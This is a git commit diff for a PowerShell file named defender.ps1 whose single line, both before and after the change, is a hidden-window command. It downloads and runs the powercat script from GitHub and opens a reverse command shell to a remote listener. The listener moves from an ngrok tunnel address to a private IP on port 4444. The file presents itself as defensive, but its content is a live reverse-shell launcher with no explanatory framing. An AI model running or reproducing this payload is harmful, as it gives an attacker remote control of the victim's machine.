ed31a60a3a4c598471ec8eb2a3162f609c8757d7
vladstanoiu <55551799+vladstanoiu@users.noreply.github.com>
2022-05-30 14:29:56 +0300

    Update defender.ps1

--- defender.ps1
+++ defender.ps1
@@ -1,1 +1,1 @@
-powershell -NoP -NonI -W hidden -c "IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c 0.tcp.ngrok.io -p 17242 -e cmd"
+powershell -NoP -NonI -W hidden -c "IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c 192.168.0.68 -p 4444 -e cmd"
